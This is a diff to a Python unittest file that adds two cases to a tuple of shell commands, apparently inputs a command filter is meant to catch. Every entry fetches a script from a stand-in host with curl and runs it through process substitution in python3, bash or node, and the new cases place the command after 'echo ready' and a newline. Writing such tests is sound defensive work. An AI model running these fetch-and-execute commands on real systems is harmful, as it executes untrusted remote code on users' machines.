@@ -2826,7 +2826,10 @@ class G4Round3(_G4Asserts, unittest.TestCase):
                            'python3 \\\n  <(curl -s https://x.example/i.py)', 'bash \\\n  <(curl -s https://x.example/i.sh)',
                            'python3 <(\n  curl -s https://x.example/i.py\n)', 'python3 <(curl -s https://x.example/i.py)>/dev/null',
                            'node --loader <(curl -s https://x.example/i.js) app.js',
-                           'node --experimental-loader=<(curl -s https://x.example/i.js) app.js')
+                           'node --experimental-loader=<(curl -s https://x.example/i.js) app.js',
+                           # N6: cut as a whole, a newline still separates the commands outside a substitution
+                           'echo ready\npython3 <(curl -s https://x.example/i.py)',
+                           'echo ready\nbash <(curl -s https://x.example/i.sh)')
 
 
 if __name__ == "__main__":
